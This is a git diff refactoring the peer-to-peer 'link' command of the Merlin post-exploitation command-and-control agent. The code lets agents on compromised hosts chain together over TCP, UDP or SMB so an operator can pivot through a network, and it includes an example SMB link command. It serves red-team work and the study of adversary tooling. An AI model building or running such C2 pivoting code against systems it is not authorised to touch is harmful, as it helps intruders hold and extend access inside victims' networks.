@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2022  Russel Van Tuyl
+// Copyright (C) 2023  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -18,6 +18,7 @@
 package commands
 
 import (
+	// Standard
 	"bytes"
 	"encoding/base64"
 	"encoding/binary"
@@ -36,7 +37,15 @@ import (
 	"github.com/Ne0nd0g/merlin-agent/cli"
 	"github.com/Ne0nd0g/merlin-agent/core"
 	"github.com/Ne0nd0g/merlin-agent/p2p"
+	p2pService "github.com/Ne0nd0g/merlin-agent/services/p2p"
 )
+
+// peerToPeerService is used to work with peer-to-peer Agent connections/link to include handling or getting Delegate messages
+var peerToPeerService *p2pService.Service
+
+func init() {
+	peerToPeerService = p2pService.NewP2PService()
+}
 
 // Link connects to the provided target over the provided protocol and establishes a peer-to-peer connection with the Agent
 func Link(cmd jobs.Command) (results jobs.Results) {
@@ -49,13 +58,7 @@ func Link(cmd jobs.Command) (results jobs.Results) {
 	// switch on first argument
 	switch strings.ToLower(cmd.Args[0]) {
 	case "list":
-		p2p.LinkedAgents.Range(
-			func(k, v interface{}) bool {
-				agent := v.(p2p.Agent)
-				results.Stdout += fmt.Sprintf("%s:%s:%s\n", agent.String(), k, agent.Remote)
-				return true
-			},
-		)
+		results.Stdout = peerToPeerService.List()
 		return
 	case "tcp":
 		if len(cmd.Args) < 2 {
@@ -69,7 +72,7 @@ func Link(cmd jobs.Command) (results jobs.Results) {
 		return Connect("udp", cmd.Args[1:])
 	case "smb":
 		if len(cmd.Args) < 3 {
-			return jobs.Results{Stderr: fmt.Sprintf("expected 2 arguments with the link smb command, received %d: %+v", len(cmd.Args), cmd.Args)}
+			return jobs.Results{Stderr: fmt.Sprintf("expected 2 arguments with the link smb command, received %d: %+v\n Example: link smb 192.168.1.1 merlinPipe", len(cmd.Args), cmd.Args)}
 		}
 		return ConnectSMB(cmd.Args[1], cmd.Args[2])
 	default:
@@ -82,16 +85,13 @@ func Link(cmd jobs.Command) (results jobs.Results) {
 // Connect establishes a TCP or UDP connection to a tcp-bind or udp-bind peer-to-peer Agent
 func Connect(network string, args []string) (results jobs.Results) {
 	cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Connect(): entering into function with network: %s, args: %+v", network, args))
-	linkedAgent := p2p.Agent{
-		In:  make(chan messages.Base, 100),
-		Out: make(chan messages.Base, 100),
-	}
 
+	var linkType int
 	switch strings.ToLower(network) {
 	case "tcp":
-		linkedAgent.Type = p2p.TCPBIND
+		linkType = p2p.TCPBIND
 	case "udp":
-		linkedAgent.Type = p2p.UDPBIND
+		linkType = p2p.UDPBIND
 	}
 
 	// args[0] = target (e.g., 192.168.1.10:8080)
@@ -100,17 +100,10 @@ func Connect(network string, args []string) (results jobs.Results) {
 		return
 	}
 
-	// See if there is already a connection to the target IP & Port
-	p2p.LinkedAgents.Range(
-		func(k, v any) bool {
-			agent := v.(p2p.Agent)
-			if agent.Type == linkedAgent.Type && agent.Remote.String() == args[0] {
-				results.Stderr = fmt.Sprintf("already connected to %s: %s:%s\n", agent.Remote, agent.String(), k)
-			}
-			return true
-		},
-	)
-	if results.Stderr != "" {
+	// See if there is already a link or connection to the target IP & Port
+	link, ok := peerToPeerService.Connected(linkType, args[0])
+	if ok {
+		results.Stderr = fmt.Sprintf("already connected to %s: %s:%s\n", link.Remote(), link.String(), link.ID())
 		return
 	}
 
@@ -118,11 +111,11 @@ func Connect(network string, args []string) (results jobs.Results) {
 	var conn net.Conn
 
 	// Establish connection to downstream agent
-	switch linkedAgent.Type {
+	switch linkType {
 	case p2p.TCPBIND, p2p.UDPBIND:
 		conn, err = net.Dial(network, args[0])
 	default:
-		err = fmt.Errorf("unhandled linked Agent type: %d", linkedAgent.Type)
+		err = fmt.Errorf("unhandled linked Agent type: %d", linkType)
 	}
 
 	if err != nil {
@@ -130,23 +123,21 @@ func Connect(network string, args []string) (results jobs.Results) {
 		return
 	}
 
-	linkedAgent.Conn = conn
-	linkedAgent.Remote = conn.RemoteAddr()
 	var n int
 
 	// We must first write data to the UDP connection to let the UDP bind Agent know we're listening and ready
-	if linkedAgent.Type == p2p.UDPBIND {
+	if linkType == p2p.UDPBIND {
 		junk := core.RandStringBytesMaskImprSrc(rand.Intn(100))
 		junk = base64.StdEncoding.EncodeToString([]byte(junk))
-		cli.Message(cli.NOTE, fmt.Sprintf("Initiating UDP connection to %s sending junk data: %s", linkedAgent.Conn.(net.Conn).RemoteAddr(), junk))
-		n, err = linkedAgent.Conn.(net.Conn).Write([]byte(junk))
-		cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to UDP connection from %s at %s", n, linkedAgent.Conn.(net.Conn).RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+		cli.Message(cli.NOTE, fmt.Sprintf("Initiating UDP connection to %s sending junk data: %s", conn.RemoteAddr(), junk))
+		n, err = conn.Write([]byte(junk))
+		cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to UDP connection from %s at %s", n, conn.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
 		if err != nil {
 			results.Stderr = fmt.Sprintf("there was an error writing data to the UDP connection: %s", err)
 			return
 		}
 		// Wait for linked agent first checking message
-		cli.Message(cli.NOTE, fmt.Sprintf("Waiting to recieve UDP connection from %s at %s...", linkedAgent.Conn.(net.Conn).RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
+		cli.Message(cli.NOTE, fmt.Sprintf("Waiting to recieve UDP connection from %s at %s...", conn.RemoteAddr(), time.Now().UTC().Format(time.RFC3339)))
 	}
 
 	var tag uint32
@@ -155,14 +146,14 @@ func Connect(network string, args []string) (results jobs.Results) {
 	for {
 		data := make([]byte, 4096)
 		// Need to have a read on the network connection for data here in this function to retrieve the linked Agent's ID so the linkedAgent structure can be stored
-		n, err = linkedAgent.Conn.(net.Conn).Read(data)
+		n, err = conn.Read(data)
 		if err != nil {
 			msg := fmt.Sprintf("there was an error reading data from linked agent %s: %s", args[0], err)
 			results.Stderr = msg
 			cli.Message(cli.WARN, msg)
 			return
 		}
-		cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Connect(): Read %d bytes from linked %s agent %s at %s", n, &linkedAgent, args[0], time.Now().UTC().Format(time.RFC3339)))
+		cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Connect(): Read %d bytes from linked %s agent %s at %s", n, p2p.String(linkType), args[0], time.Now().UTC().Format(time.RFC3339)))
 
 		// Add the bytes to the buffer
 		n, err = buff.Write(data[:n])
@@ -207,7 +198,7 @@ func Connect(network string, args []string) (results jobs.Results) {
 			cli.Message(cli.DEBUG, fmt.Sprintf("command/link.Connect(): Read %d of %d bytes into the buffer", buff.Len(), length+4+8))
 		}
 	}
-	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from linked %s agent %s at %s", buff.Len(), &linkedAgent, args[0], time.Now().UTC().Format(time.RFC3339)))
+	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from linked %s agent %s at %s", buff.Len(), p2p.String(linkType), args[0], time.Now().UTC().Format(time.RFC3339)))
 
 	// Decode GOB from server response into Base
 	var msg messages.Delegate
@@ -221,13 +212,14 @@ func Connect(network string, args []string) (results jobs.Results) {
 	}
 
 	// Store LinkedAgent
-	p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
+	linkedAgent := p2p.NewLink(msg.Agent, conn, linkType, conn.RemoteAddr())
+	peerToPeerService.AddLink(linkedAgent)
 
-	p2p.AddDelegateMessage(msg)
+	peerToPeerService.AddDelegate(msg)
 
 	results.Stdout = fmt.Sprintf("Successfully connected to %s at %s", msg.Agent, args[0])
 
 	// The listen function is in commands/listen.go
-	go listen(linkedAgent.Conn.(net.Conn))
+	go listen(conn)
 	return
 }
